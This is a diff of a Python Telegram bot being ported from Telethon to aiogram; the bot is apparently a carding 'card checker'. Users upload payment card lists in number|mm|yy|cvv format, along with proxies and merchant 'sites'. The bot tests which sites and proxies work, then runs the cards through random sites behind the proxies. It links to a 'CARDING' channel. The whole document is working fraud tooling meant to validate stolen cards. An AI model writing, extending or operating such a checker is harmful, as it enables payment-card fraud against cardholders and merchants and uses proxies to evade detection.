-    user_proxies = proxies.get(str(user_id), [])
-    if not user_proxies:
-        return await event.reply("❌ You need at least one working proxy!")
-    
-    sites = await load_json(USER_SITES_FILE)
-    user_sites = sites.get(str(user_id), [])
-    if not user_sites:
-        return await event.reply("❌ You need at least one working site!")
-    
-    file_path = await replied.download_media()
-    
-    try:
-        async with aiofiles.open(file_path, 'r', encoding='utf-8') as f:
-            content = await f.read()
-    except:
-        async with aiofiles.open(file_path, 'r', encoding='latin-1') as f:
-            content = await f.read()
-    
-    os.remove(file_path)
-    
     cards = extract_cards(content)
-    
     if not cards:
-        return await event.reply("```❌ No valid cards found in file!```")
-    
-    lines = content.splitlines()
-    if len(lines) > MAX_CARDS_FILE:
-        return await event.reply(f"```❌ File too large! Max {MAX_CARDS_FILE} lines.```")
-    
-    if len(cards) > MAX_CARDS:
-        cards = cards[:MAX_CARDS]
-        await event.reply(f"```⚠️ Checking only first {MAX_CARDS} cards```")
-    
-    active_processes[user_id] = {'type': 'checking'}
-    await event.reply(f"```🍑 Preparing to check {len(cards)} cards with random sites...```")
-    
-    await process_card_check(event, cards, user_sites, user_proxies)
+        return await message.reply("`❌ No valid cards found in file!`", parse_mode="Markdown")
 
-@client.on(events.NewMessage(pattern='/check'))
-async def check_command(event):
-    user_id = event.sender_id
-    
-    if user_id in active_processes:
-        return await event.reply("```You already have an active process!```")
-    
-    proxies = await load_json(USER_PROXIES_FILE)
-    user_proxies = proxies.get(str(user_id), [])
-    if not user_proxies:
-        return await event.reply("❌ You need at least one working proxy!")
-    
-    sites = await load_json(USER_SITES_FILE)
-    user_sites = sites.get(str(user_id), [])
-    if not user_sites:
-        return await event.reply("❌ You have no sites to check!")
-    
-    active_processes[user_id] = {'type': 'testing_sites'}
-    await event.reply(f"🔄 Testing {len(user_sites)} sites...")
-    
-    working = []
-    dead = []
-    proxy = random.choice(user_proxies)['url']
-    
-    for i, site in enumerate(user_sites, 1):
-        try:
-            await event.edit(f"🔄 Testing [{i}/{len(user_sites)}]: {site}")
-        except:
-            pass
-        
-        result = await test_site_via_api(site, proxy)
-        if result.get('working'):
-            working.append(site)
-        else:
-            dead.append(site)
-        
-        await asyncio.sleep(0.5)
-    
-    if dead:
-        sites[str(user_id)] = working
-        await save_json(USER_SITES_FILE, sites)
-    
-    result_text = f"""✅ Site Check Complete!
-
-📊 Total: {len(user_sites)}
-🟢 Working: {len(working)}
-🔴 Dead: {len(dead)}"""
-    
-    await event.edit(result_text)
-    active_processes.pop(user_id, None)
-
-@client.on(events.NewMessage(pattern='/info'))
-async def info_command(event):
-    user_id = str(event.sender_id)
-    user = await event.get_sender()
-    
-    sites = await load_json(USER_SITES_FILE)
-    proxies = await load_json(USER_PROXIES_FILE)
-    
-    sites_count = len(sites.get(user_id, []))
-    proxies_count = len(proxies.get(user_id, []))
-    
-    text = f"""
-👤 User Information
-
-User ID: `{event.sender_id}`
-Username: @{user.username if user.username else 'N/A'}
-
-📊 Statistics:
-• Sites: {sites_count}/{MAX_SITES}
-• Proxies: {proxies_count}/{MAX_PROXIES}
-"""
-    
-    await event.reply(text)
-
-# ==================== BOT START MENU ====================
-@client.on(events.NewMessage)
-async def handler(event):
-    if event.message.text and event.message.text.startswith('/'):
-        return
-    
-    user_id = event.sender_id
-    
-    if event.message.file:
-        await handle_file_upload(event)
-        return
-    
-    if user_id in active_processes:
-        process_type = active_processes[user_id].get('type')
-        if process_type in ['waiting_sites', 'waiting_proxies', 'waiting_cards']:
-            await handle_text_input(event)
-        return
-    
-    await show_start_menu(event)
-
-async def show_start_menu(event):
-    user = await event.get_sender()
-    username = user.username if user.username else "User"
-    first_name = user.first_name if user.first_name else "there"
-    
-    buttons = [
-        [Button.url("𝙼𝙰𝙸𝙽 ", "https://t.me/afuonax"),
-         Button.url("𝙲𝙰𝚁𝙳𝙸𝙽𝙶", SECOND_CHANNEL_LINK)],
-        [Button.inline("💳 CHECK CARDS", b"check_cards"),
-         Button.inline("🌐 ADD SITES", b"add_sites")],
-        [Button.inline("🔌 ADD PROXY", b"add_proxies"),
-         Button.inline("📋 MY SITES", b"my_sites")],
-        [Button.inline("📋 MY PROXIES", b"my_proxies"),
-         Button.inline("🧪 TEST SITES", b"test_sites")],
-        [Button.inline("🧪 TEST PROXIES", b"test_proxies"),
-         Button.inline("ℹ️ USER INFO", b"user_info")]
-    ]
-    
-    
-    for ext in ['jpg', 'jpeg', 'png']:
-        if os.path.exists(f"bot_image.{ext}"):
-            try:
-                await client.send_file(
-                    event.chat_id,
-                    f"bot_image.{ext}",
-                    caption=f"✨ 𝗪𝗲𝗹𝗰𝗼𝗺𝗲, {first_name}!\n 𝚍𝚘𝚗'𝚝 𝚏𝚘𝚛𝚐𝚎𝚝 𝚝𝚘 𝚜𝚞𝚋𝚜𝚌𝚛𝚒𝚋𝚎 𝚝𝚘 𝚝𝚑𝚎 𝚌𝚑𝚊𝚗𝚗𝚎𝚕𝚜 ‌♡⁩ ",
-                    buttons=buttons
-                )
-                return  
-            except:
-                continue
-    
-    
-    await event.reply(f"✨ 𝗪𝗲𝗹𝗰𝗼𝗺𝗲, {first_name}!\n𝚍𝚘𝚗'𝚝 𝚏𝚘𝚛𝚐𝚎𝚝 𝚝𝚘 𝚜𝚞𝚋𝚜𝚌𝚛𝚒𝚋𝚎 𝚝𝚘 𝚝𝚑𝚎 𝚌𝚑𝚊𝚗𝚗𝚎𝚕𝚜 ‌♡⁩ ", buttons=buttons)
+    active_processes[user_id] = {'type': 'checking_cards'}
+    await process_card_check(message, cards[:MAX_CARDS], user_sites, user_proxies)
 
 # ==================== CALLBACK HANDLERS ====================
-@client.on(events.CallbackQuery)
-async def callback_handler(event):
-    data = event.data.decode()
-    user_id = event.sender_id
-    
-    if data == "main_menu":
-        await show_main_menu(event)
-    
-    elif data == "back_to_start":
-        await event.answer()
-        await show_start_menu(event)
-    
-    elif data == "back_to_main":
-        await event.answer()
-        await show_main_menu(event)
-    
-    elif data == "check_cards":
-        await event.answer()
-        await show_check_cards_menu(event)
-    
-    elif data == "add_sites":
-        await event.answer()
-        await show_add_sites_menu(event)
-    
-    elif data == "add_proxies":
-        await event.answer()
-        await show_add_proxies_menu(event)
-    
-    elif data == "my_sites":
-        await event.answer()
-        await show_my_sites(event)
-    
-    elif data == "my_proxies":
-        await event.answer()
-        await show_my_proxies(event)
-    
-    elif data == "test_sites":
-        await event.answer()
-        await start_test_sites(event)
-    
-    elif data == "test_proxies":
-        await event.answer()
-        await start_test_proxies(event)
-    
-    elif data == "user_info":
-        await event.answer()
-        await show_user_info(event)
-    
-    elif data.startswith("removesite_"):
-        site_index = int(data.split("_")[1])
-        await remove_site_by_index(event, site_index)
-    
-    elif data.startswith("removeproxy_"):
-        proxy_index = int(data.split("_")[1])
-        await remove_proxy_by_index(event, proxy_index)
-    
-    elif data == "remove_all_sites":
-        await remove_all_sites(event)
-    elif data == "remove_all_proxies":
-        await remove_all_proxies(event)
-    
-    elif data.startswith("stop:"):
-        parts = data.split(":")
-        if len(parts) == 2 and parts[1].isdigit():
-            process_user_id = int(parts[1])
-            if user_id == process_user_id:
-                if process_user_id in active_processes:
-                    active_processes.pop(process_user_id, None)
-                    await event.answer("⛔ Stopped!", alert=True)
-                    await event.edit("```⛔ Process stopped by user```")
-                else:
-                    await event.answer("❌ No active process!", alert=True)
-            else:
-                await event.answer("❌ Not your process!", alert=True)
 
-# ==================== MENU DISPLAY FUNCTIONS 
-async def show_main_menu(event):
-    menu_text = f"""
-┏━━━━━━━━━━━━━━━━┓
-┃ 💳 {format_bold('Check Cards')} » /checkcards
-┃ 🌐 {format_bold('Add Sites')} » /addsites
-┃ 🔌 {format_bold('Add Proxy')} » /addproxy
-┃ 📋 {format_bold('My Sites')} » /mysites
-┃ 📋 {format_bold('My Proxies')} » /myproxies
-┃ 🧪 {format_bold('Test Sites')} » /testsites
-┃ ℹ️ {format_bold('User Info')} » /info
-┗━━━━━━━━━━━━━━━━┛
+@dp.callback_query(F.data == "noop")
+async def cb_noop(cq: CallbackQuery):
+    await cq.answer()
 
-"""
-    
-    buttons = [
-        [Button.inline("💳 CHECK CARDS", b"check_cards"),
-         Button.inline("🌐 ADD SITES", b"add_sites")],
-        [Button.inline("🔌 ADD PROXY", b"add_proxies"),
-         Button.inline("📋 MY SITES", b"my_sites")],
-        [Button.inline("📋 MY PROXIES", b"my_proxies"),
-         Button.inline("🧪 TEST SITES", b"test_sites")],
-        [Button.inline("🧪 TEST PROXIES", b"test_proxies"),
-         Button.inline("ℹ️ USER INFO", b"user_info")],
-        [Button.inline("🔙 BACK TO START", b"back_to_start")]
-    ]
-    
-    image_sent = False
-    for ext in ['jpg', 'jpeg', 'png']:
-        if os.path.exists(f"bot_image.{ext}"):
-            try:
-                await event.delete()
-                await client.send_file(
-                    event.chat_id,
-                    f"bot_image.{ext}",
-                    caption=menu_text,
-                    buttons=buttons
-                )
-                image_sent = True
-                break
-            except:
-                pass
-    
-    if not image_sent:
-        await event.edit(menu_text, buttons=buttons)
+@dp.callback_query(F.data.startswith("noop:"))
+async def cb_noop_uid(cq: CallbackQuery):
+    await cq.answer()
 
-async def show_check_cards_menu(event):
-    menu_text = f"""
-┏━━━━━━━━━━━━━━━━┓
-┃ 📤 {format_bold('Send me a .txt file')}
-┃    {format_bold('with your cards.')}
-┃
-┃ 📊 {format_bold('Limits:')}
-┃ • {format_bold('Max cards per file')}: {MAX_CARDS_FILE}
-┃ • {format_bold('Max saved cards')}: {MAX_CARDS}
-┃
-┃ 📝 {format_bold('Format')}: number|mm|yy|cvv
-┃ ✦ {format_bold('Example')}: 4242424242424242|12|25|123
-┗━━━━━━━━━━━━━━━━┛
+@dp.callback_query(F.data == "back_to_start")
+async def cb_back_start(cq: CallbackQuery):
+    await cq.answer()
+    first_name = cq.from_user.first_name or "there"
+    await send_start_menu(cq, first_name)
 
-"""
-    
-    buttons = [[Button.inline("🔙 BACK TO MAIN", b"back_to_main")]]
-    
-    image_sent = False
-    for ext in ['jpg', 'jpeg', 'png']:
-        if os.path.exists(f"bot_image.{ext}"):
-            try:
-                await event.delete()
-                await client.send_file(
-                    event.chat_id,
-                    f"bot_image.{ext}",
-                    caption=menu_text,
-                    buttons=buttons
-                )
-                image_sent = True
-                break
-            except:
-                pass
-    
-    if not image_sent:
-        await event.edit(menu_text, buttons=buttons)
-    
-    active_processes[event.sender_id] = {'type': 'waiting_cards'}
+@dp.callback_query(F.data == "back_to_main")
+async def cb_back_main(cq: CallbackQuery):
+    await cq.answer()
+    await send_main_menu(cq)
 
-async def show_add_sites_menu(event):
-    menu_text = f"""
-┏━━━━━━━━━━━━━━━━┓
-┃ 📤 {format_bold('Send me a .txt file')}
-┃    {format_bold('with your sites.')}
-┃
-┃ 📊 {format_bold('Limits:')}
-┃ • {format_bold('Max sites per file')}: {MAX_SITES_FILE}
-┃ • {format_bold('Max saved sites')}: {MAX_SITES}
-┃
-┃ ✦ {format_bold('Example')}:
-┃   shop.com
-┃   example.com
-┃   test.com
-┃
-┃ ⚠️ {format_bold('Note')}: {format_bold('Only working sites will be saved.')}
-┗━━━━━━━━━━━━━━━━┛
+@dp.callback_query(F.data == "main_menu")
+async def cb_main_menu(cq: CallbackQuery):
+    await cq.answer()
+    await send_main_menu(cq)
 
-"""
-    
-    buttons = [[Button.inline("🔙 BACK TO MAIN", b"back_to_main")]]
-    
-    image_sent = False
-    for ext in ['jpg', 'jpeg', 'png']:
-        if os.path.exists(f"bot_image.{ext}"):
-            try:
-                await event.delete()
-                await client.send_file(
-                    event.chat_id,
-                    f"bot_image.{ext}",
-                    caption=menu_text,
-                    buttons=buttons
-                )
-                image_sent = True
-                break
-            except:
-                pass
-    
-    if not image_sent:
-        await event.edit(menu_text, buttons=buttons)
-    
-    active_processes[event.sender_id] = {'type': 'waiting_sites'}
+@dp.callback_query(F.data == "check_cards")
+async def cb_check_cards(cq: CallbackQuery):
+    await cq.answer()
+    text = (
+        "┏━━━━━━━━━━━━━━━━┓\n"
+        f"┃ 📤 {format_bold('Send me a .txt file with your cards.')}\n"
+        f"┃ 📊 {format_bold('Limits:')}\n"
+        f"┃ • {format_bold('Max cards per file')}: {MAX_CARDS_FILE}\n"
+        f"┃ 📝 {format_bold('Format')}: number|mm|yy|cvv\n"
+        f"┃ ✦ {format_bold('Example')}: 4242424242424242|12|25|123\n"
+        "┗━━━━━━━━━━━━━━━━┛"
+    )
+    try:
+        await cq.message.edit_text(text, reply_markup=kb_back_main())
+    except:
+        await cq.message.answer(text, reply_markup=kb_back_main())
+    active_processes[cq.from_user.id] = {'type': 'waiting_cards'}
 
-async def show_add_proxies_menu(event):
-    menu_text = f"""
-┏━━━━━━━━━━━━━━━━┓
-┃ 📤 {format_bold('Send me a .txt file')}
-┃    {format_bold('with your proxies.')}
-┃
-┃ 📊 {format_bold('Limits:')}
-┃ • {format_bold('Max proxies per file')}: {MAX_PROXIES_FILE}
-┃ • {format_bold('Max saved proxies')}: {MAX_PROXIES}
-┃
-┃ 🔧 {format_bold('Formats supported')}:
-┃ • ip:port
-┃ • ip:port:user:pass
-┃ • user:pass@ip:port
-┃ • socks5://ip:port
-┃
-┃ ⚠️ {format_bold('Note')}: {format_bold('Only working proxies will be saved.')}
-┗━━━━━━━━━━━━━━━━┛
+@dp.callback_query(F.data == "add_sites")
+async def cb_add_sites(cq: CallbackQuery):
+    await cq.answer()
+    text = (
+        "┏━━━━━━━━━━━━━━━━┓\n"
+        f"┃ 📤 {format_bold('Send a .txt file or paste sites.')}\n"
+        f"┃ 📊 {format_bold('Limits:')} Max {MAX_SITES_FILE} sites / {MAX_SITES} saved\n"
+        f"┃ ✦ {format_bold('Example')}: shop.com  |  example.com\n"
+        f"┃ ⚠️ {format_bold('Only working sites will be saved.')}\n"
+        "┗━━━━━━━━━━━━━━━━┛"
+    )
+    try:
+        await cq.message.edit_text(text, reply_markup=kb_back_main())
+    except:
+        await cq.message.answer(text, reply_markup=kb_back_main())
+    active_processes[cq.from_user.id] = {'type': 'waiting_sites'}
 
-"""
-    
-    buttons = [[Button.inline("🔙 BACK TO MAIN", b"back_to_main")]]
-    
-    image_sent = False
-    for ext in ['jpg', 'jpeg', 'png']:
-        if os.path.exists(f"bot_image.{ext}"):
-            try:
-                await event.delete()
-                await client.send_file(
-                    event.chat_id,
-                    f"bot_image.{ext}",
-                    caption=menu_text,
-                    buttons=buttons
-                )
-                image_sent = True
-                break
-            except:
-                pass
-    
-    if not image_sent:
-        await event.edit(menu_text, buttons=buttons)
-    
-    active_processes[event.sender_id] = {'type': 'waiting_proxies'}
+@dp.callback_query(F.data == "add_proxies")
+async def cb_add_proxies(cq: CallbackQuery):
+    await cq.answer()
+    text = (
+        "┏━━━━━━━━━━━━━━━━┓\n"
+        f"┃ 📤 {format_bold('Send a .txt file or paste proxies.')}\n"
+        f"┃ 📊 {format_bold('Limits:')} Max {MAX_PROXIES_FILE} / {MAX_PROXIES} saved\n"
+        f"┃ 🔧 {format_bold('Formats:')}\n"
+        "┃ • ip:port\n"
+        "┃ • ip:port:user:pass\n"
+        "┃ • user:pass@ip:port\n"
+        "┃ • socks5://ip:port\n"
+        f"┃ ⚠️ {format_bold('Only working proxies will be saved.')}\n"
+        "┗━━━━━━━━━━━━━━━━┛"
+    )
+    try:
+        await cq.message.edit_text(text, reply_markup=kb_back_main())
+    except:
+        await cq.message.answer(text, reply_markup=kb_back_main())
+    active_processes[cq.from_user.id] = {'type': 'waiting_proxies'}
 
-async def show_my_sites(event):
-    user_id = str(event.sender_id)
+@dp.callback_query(F.data == "my_sites")
+async def cb_my_sites(cq: CallbackQuery):
+    await cq.answer()
+    await _show_my_sites(cq)
+
+@dp.callback_query(F.data == "my_proxies")
+async def cb_my_proxies(cq: CallbackQuery):
+    await cq.answer()
+    await _show_my_proxies(cq)
+
+@dp.callback_query(F.data == "test_sites")
+async def cb_test_sites(cq: CallbackQuery):
+    await cq.answer()
+    await _start_test_sites(cq)
+
+@dp.callback_query(F.data == "test_proxies")
+async def cb_test_proxies(cq: CallbackQuery):
+    await cq.answer()
+    await _start_test_proxies(cq)
+
+@dp.callback_query(F.data == "user_info")
+async def cb_user_info(cq: CallbackQuery):
+    await cq.answer()
+    user_id = str(cq.from_user.id)
+    sites_data   = await load_json(USER_SITES_FILE)
+    proxies_data = await load_json(USER_PROXIES_FILE)
+    sc = len(sites_data.get(user_id, []))
+    pc = len(proxies_data.get(user_id, []))
+    text = (
+        "┏━━━━━━━━━━━━━━━━┓\n"
+        f"┃ 🆔 {format_bold('User ID')}: `{cq.from_user.id}`\n"
+        f"┃ 🧑 {format_bold('Username')}: @{cq.from_user.username or 'N/A'}\n"
+        f"┃ 📛 {format_bold('Name')}: {cq.from_user.first_name or 'N/A'}\n"
+        f"┃ 🌐 {format_bold('Sites')}: {sc}/{MAX_SITES}\n"
+        f"┃ 🔌 {format_bold('Proxies')}: {pc}/{MAX_PROXIES}\n"
+        "┗━━━━━━━━━━━━━━━━┛"
+    )
+    try:
+        await cq.message.edit_text(text, reply_markup=kb_back_main(), parse_mode="Markdown")
+    except:
+        await cq.message.answer(text, reply_markup=kb_back_main(), parse_mode="Markdown")
+
+@dp.callback_query(F.data.startswith("removesite_"))
+async def cb_removesite(cq: CallbackQuery):
+    idx = int(cq.data.split("_")[1])
+    user_id = str(cq.from_user.id)
     sites_data = await load_json(USER_SITES_FILE)
     user_sites = sites_data.get(user_id, [])
-    
-    if not user_sites:
-        menu_text = f"""
-
-┏━━━━━━━━━━━━━━━━┓
-┃ ❌ {format_bold('You have no saved sites.')}
-┃
-┃ {format_bold('Use "🌐 ADD SITES" to add some.')}
-┗━━━━━━━━━━━━━━━━┛
-"""
-        buttons = [[Button.inline("🔙 BACK TO MAIN", b"back_to_main")]]
-        
-        image_sent = False
-        for ext in ['jpg', 'jpeg', 'png']:
-            if os.path.exists(f"bot_image.{ext}"):
-                try:
-                    await event.delete()
-                    await client.send_file(
-                        event.chat_id,
-                        f"bot_image.{ext}",
-                        caption=menu_text,
-                        buttons=buttons
-                    )
-                    image_sent = True
-                    break
-                except:
-                    pass
-        
-        if not image_sent:
-            await event.edit(menu_text, buttons=buttons)
-        return
-    
-    site_list = ""
-    for i, site in enumerate(user_sites, 1):
-        site_list += f" {i}. `{site}`\n"
-    
-    menu_text = f"""
-┏━━━━━━━━━━━━━━━━┓
-┃ 📊 {format_bold('Total')}: {len(user_sites)}/{MAX_SITES}
-┃
-{site_list}┗━━━━━━━━━━┛
-
-"""
-    
-    buttons = []
-    
-    for i in range(1, min(6, len(user_sites) + 1)):
-        buttons.append([Button.inline(f"🗑️ {format_bold(f'Remove #{i}')}", f"removesite_{i-1}".encode())])
-    
-    if len(user_sites) > 5:
-        buttons.append([Button.inline(f"🗑️ {format_bold('Remove All')}", b"remove_all_sites")])
-    
-    buttons.append([Button.inline("🔙 BACK TO MAIN", b"back_to_main")])
-    
-    image_sent = False
-    for ext in ['jpg', 'jpeg', 'png']:
-        if os.path.exists(f"bot_image.{ext}"):
-            try:
-                await event.delete()
-                await client.send_file(
-                    event.chat_id,
-                    f"bot_image.{ext}",
-                    caption=menu_text,
-                    buttons=buttons
-                )
-                image_sent = True
-                break
-            except:
-                pass
-    
-    if not image_sent:
-        await event.edit(menu_text, buttons=buttons)
-
-async def show_my_proxies(event):
-    user_id = str(event.sender_id)
-    proxies_data = await load_json(USER_PROXIES_FILE)
-    user_proxies = proxies_data.get(user_id, [])
-    
-    if not user_proxies:
-        menu_text = f"""
-┏━━━━━━━━━━━━━━━┓
-┃ ❌ {format_bold('You have no saved proxies.')}
-┃
-┃ {format_bold('Use "🔌 ADD PROXIES" to add some.')}
-┗━━━━━━━━━━━━━━━┛
-
-𖣐━━━━━━━━━━━━━━𖣐
-"""
-        buttons = [[Button.inline("🔙 BACK TO MAIN", b"back_to_main")]]
-        
-        image_sent = False
-        for ext in ['jpg', 'jpeg', 'png']:
-            if os.path.exists(f"bot_image.{ext}"):
-                try:
-                    await event.delete()
-                    await client.send_file(
-                        event.chat_id,
-                        f"bot_image.{ext}",
-                        caption=menu_text,
-                        buttons=buttons
-                    )
-                    image_sent = True
-                    break
-                except:
-                    pass
-        
-        if not image_sent:
-            await event.edit(menu_text, buttons=buttons)
-        return
-    
-    proxy_list = ""
-    for i, proxy in enumerate(user_proxies, 1):
-        proxy_list += f" {i}. `{proxy['original']}`\n"
-    
-    menu_text = f"""
-
-┏━━━━━━━━━━━━━━━━┓
-┃ 📊 {format_bold('Total')}: {len(user_proxies)}/{MAX_PROXIES}
-┃
-{proxy_list}┗━━━━━━━━━┛
-
-"""
-    
-    buttons = []
-    
-    for i in range(1, min(6, len(user_proxies) + 1)):
-        buttons.append([Button.inline(f"🗑️ {format_bold(f'Remove #{i}')}", f"removeproxy_{i-1}".encode())])
-    
-    if len(user_proxies) > 5:
-        buttons.append([Button.inline(f"🗑️ {format_bold('Remove All')}", b"remove_all_proxies")])
-    
-    buttons.append([Button.inline("🔙 BACK TO MAIN", b"back_to_main")])
-    
-    image_sent = False
-    for ext in ['jpg', 'jpeg', 'png']:
-        if os.path.exists(f"bot_image.{ext}"):
-            try:
-                await event.delete()
-                await client.send_file(
-                    event.chat_id,
-                    f"bot_image.{ext}",
-                    caption=menu_text,
-                    buttons=buttons
-                )
-                image_sent = True
-                break
-            except:
-                pass
-    
-    if not image_sent:
-        await event.edit(menu_text, buttons=buttons)
-
-async def show_user_info(event):
-    user_id = str(event.sender_id)
-    user = await event.get_sender()
-    
-    sites_data = await load_json(USER_SITES_FILE)
-    proxies_data = await load_json(USER_PROXIES_FILE)
-    
-    sites_count = len(sites_data.get(user_id, []))
-    proxies_count = len(proxies_data.get(user_id, []))
-    
-    menu_text = f"""
-┏━━━━━━━━━━━━━━━━┓
-┃ 🆔 {format_bold('User ID')}: `{event.sender_id}`
-┃ 🧑 {format_bold('Username')}: @{user.username if user.username else 'N/A'}
-┃ 📛 {format_bold('Name')}: {user.first_name or 'N/A'}
-┃
-┃ 📊 {format_bold('Statistics')}:
-┃ 🌐 {format_bold('Sites')}: {sites_count}/{MAX_SITES}
-┃ 🔌 {format_bold('Proxies')}: {proxies_count}/{MAX_PROXIES}
-┗━━━━━━━━━━━━━━━━┛
-"""
-    
-    buttons = [[Button.inline("🔙 BACK TO MAIN", b"back_to_main")]]
-    
-    image_sent = False
-    for ext in ['jpg', 'jpeg', 'png']:
-        if os.path.exists(f"bot_image.{ext}"):
-            try:
-                await event.delete()
-                await client.send_file(
-                    event.chat_id,
-                    f"bot_image.{ext}",
-                    caption=menu_text,
-                    buttons=buttons
-                )
-                image_sent = True
-                break
-            except:
-                pass
-    
-    if not image_sent:
-        await event.edit(menu_text, buttons=buttons)
-
-async def start_test_sites(event):
-    user_id = str(event.sender_id)
-    int_user_id = event.sender_id
-    
-    if int_user_id in active_processes and active_processes[int_user_id].get('type') not in ['waiting_sites', 'waiting_proxies', 'waiting_cards']:
-        await event.answer("❌ You already have an active process! Wait for it to finish.", alert=True)
-        return
-    
-    proxies_data = await load_json(USER_PROXIES_FILE)
-    user_proxies = proxies_data.get(user_id, [])
-    
-    if not user_proxies:
-        await event.answer("❌ You need at least one working proxy to test sites!", alert=True)
-        return
-    
-    sites_data = await load_json(USER_SITES_FILE)
-    user_sites = sites_data.get(user_id, [])
-    
-    if not user_sites:
-        await event.answer("❌ You have no sites to test!", alert=True)
-        return
-    
-    active_processes[int_user_id] = {'type': 'testing_sites'}
-    
-    await event.edit("🍑 Preparing to test your sites...")
-    
-    working_sites = []
-    dead_sites = []
-    proxy = random.choice(user_proxies)['url']
-    
-    total = len(user_sites)
-    for i, site in enumerate(user_sites, 1):
-        try:
-            await event.edit(f"🍑 Testing sites... [{i}/{total}]")
-        except:
-            pass
-        
-        result = await test_site_via_api(site, proxy)
-        
-        if result.get('working'):
-            working_sites.append(site)
-        else:
-            dead_sites.append(site)
-        
-        await asyncio.sleep(0.5)
-    
-    if dead_sites:
-        sites_data[user_id] = working_sites
-        await save_json(USER_SITES_FILE, sites_data)
-    
-    text = f"""
-𖣐━━━━━━━━━━━━━━𖣐
-✅ {format_bold('SITE TEST COMPLETE')}
-𖣐━━━━━━━━━━━━━━𖣐
-
-📊 {format_bold('Total Tested')}: {total}
-🟢 {format_bold('Working')}: {len(working_sites)}
-🔴 {format_bold('Dead')}: {len(dead_sites)}
-
-"""
-    
-    if dead_sites:
-        text += f"🔴 {format_bold('Dead Sites Removed')}:\n"
-        for site in dead_sites[:5]:
-            text += f"• `{site}`\n"
-        if len(dead_sites) > 5:
-            text += f"... and {len(dead_sites)-5} more\n"
-    
-    buttons = [[Button.inline("🔙 BACK TO MAIN", b"back_to_main")]]
-    
-    await event.edit(text, buttons=buttons)
-    
-    active_processes.pop(int_user_id, None)
-
-async def start_test_proxies(event):
-    user_id = str(event.sender_id)
-    int_user_id = event.sender_id
-    
-    if int_user_id in active_processes and active_processes[int_user_id].get('type') not in ['waiting_sites', 'waiting_proxies', 'waiting_cards']:
-        await event.answer("❌ You already have an active process! Wait for it to finish.", alert=True)
-        return
-    
-    proxies_data = await load_json(USER_PROXIES_FILE)
-    user_proxies = proxies_data.get(user_id, [])
-    
-    if not user_proxies:
-        await event.answer("❌ You have no proxies to test!", alert=True)
-        return
-    
-    active_processes[int_user_id] = {'type': 'testing_proxies'}
-    
-    await event.edit("🍑 Preparing to test your proxies...")
-    
-    working_proxies = []
-    dead_proxies = []
-    
-    total = len(user_proxies)
-    for i, proxy_data in enumerate(user_proxies, 1):
-        try:
-            await event.edit(f"🍑 Testing proxies... [{i}/{total}]")
-        except:
-            pass
-        
-        is_working, _ = await test_proxy(proxy_data['url'])
-        
-        if is_working:
-            working_proxies.append(proxy_data)
-        else:
-            dead_proxies.append(proxy_data)
-        
-        await asyncio.sleep(0.5)
-    
-    if dead_proxies:
-        proxies_data[user_id] = working_proxies
-        await save_json(USER_PROXIES_FILE, proxies_data)
-    
-    text = f"""
-𖣐━━━━━━━━━━━━━━𖣐
-✅ {format_bold('PROXY TEST COMPLETE')}
-𖣐━━━━━━━━━━━━━━𖣐
-
-📊 {format_bold('Total Tested')}: {total}
-🟢 {format_bold('Working')}: {len(working_proxies)}
-🔴 {format_bold('Dead')}: {len(dead_proxies)}
-
-"""
-    
-    if dead_proxies:
-        text += f"🔴 {format_bold('Dead Proxies Removed')}:\n"
-        for proxy in dead_proxies[:5]:
-            text += f"• `{proxy['original']}`\n"
-        if len(dead_proxies) > 5:
-            text += f"... and {len(dead_proxies)-5} more\n"
-    
-    buttons = [[Button.inline("🔙 BACK TO MAIN", b"back_to_main")]]
-    
-    await event.edit(text, buttons=buttons)
-    
-    active_processes.pop(int_user_id, None)
-
-async def remove_site_by_index(event, index):
-    user_id = str(event.sender_id)
-    sites_data = await load_json(USER_SITES_FILE)
-    user_sites = sites_data.get(user_id, [])
-    
-    if 0 <= index < len(user_sites):
-        removed = user_sites.pop(index)
-        
+    if 0 <= idx < len(user_sites):
+        removed = user_sites.pop(idx)
         if user_sites:
             sites_data[user_id] = user_sites
-        else:
+        elif user_id in sites_data:
             del sites_data[user_id]
-        
         await save_json(USER_SITES_FILE, sites_data)
-        await event.answer(f"✅ Removed: {removed}", alert=True)
-        await show_my_sites(event)
+        await cq.answer(f"✅ Removed: {removed}", show_alert=True)
     else:
-        await event.answer("❌ Invalid index!", alert=True)
+        await cq.answer("❌ Invalid index!", show_alert=True)
+    await _show_my_sites(cq)
 
-async def remove_proxy_by_index(event, index):
-    user_id = str(event.sender_id)
+@dp.callback_query(F.data.startswith("removeproxy_"))
+async def cb_removeproxy(cq: CallbackQuery):
+    idx = int(cq.data.split("_")[1])
+    user_id = str(cq.from_user.id)
     proxies_data = await load_json(USER_PROXIES_FILE)
     user_proxies = proxies_data.get(user_id, [])
-    
-    if 0 <= index < len(user_proxies):
-        removed = user_proxies.pop(index)
-        
+    if 0 <= idx < len(user_proxies):
+        removed = user_proxies.pop(idx)
         if user_proxies:
             proxies_data[user_id] = user_proxies
-        else:
+        elif user_id in proxies_data:
             del proxies_data[user_id]
-        
         await save_json(USER_PROXIES_FILE, proxies_data)
-        await event.answer(f"✅ Removed: {removed['original']}", alert=True)
-        await show_my_proxies(event)
+        await cq.answer(f"✅ Removed: {removed['original']}", show_alert=True)
     else:
-        await event.answer("❌ Invalid index!", alert=True)
+        await cq.answer("❌ Invalid index!", show_alert=True)
+    await _show_my_proxies(cq)
 
-async def remove_all_sites(event):
-    user_id = str(event.sender_id)
+@dp.callback_query(F.data == "remove_all_sites")
+async def cb_remove_all_sites(cq: CallbackQuery):
+    user_id = str(cq.from_user.id)
     sites_data = await load_json(USER_SITES_FILE)
-    
     if user_id in sites_data:
         count = len(sites_data[user_id])
         del sites_data[user_id]
         await save_json(USER_SITES_FILE, sites_data)
-        await event.answer(f"✅ Removed all {count} sites!", alert=True)
+        await cq.answer(f"✅ Removed all {count} sites!", show_alert=True)
     else:
-        await event.answer("❌ No sites to remove!", alert=True)
-    
-    await show_my_sites(event)
+        await cq.answer("❌ No sites to remove!", show_alert=True)
+    await _show_my_sites(cq)
 
-async def remove_all_proxies(event):
-    user_id = str(event.sender_id)
+@dp.callback_query(F.data == "remove_all_proxies")
+async def cb_remove_all_proxies(cq: CallbackQuery):
+    user_id = str(cq.from_user.id)
     proxies_data = await load_json(USER_PROXIES_FILE)
-    
     if user_id in proxies_data:
         count = len(proxies_data[user_id])
         del proxies_data[user_id]
         await save_json(USER_PROXIES_FILE, proxies_data)
-        await event.answer(f"✅ Removed all {count} proxies!", alert=True)
+        await cq.answer(f"✅ Removed all {count} proxies!", show_alert=True)
     else:
-        await event.answer("❌ No proxies to remove!", alert=True)
-    
-    await show_my_proxies(event)
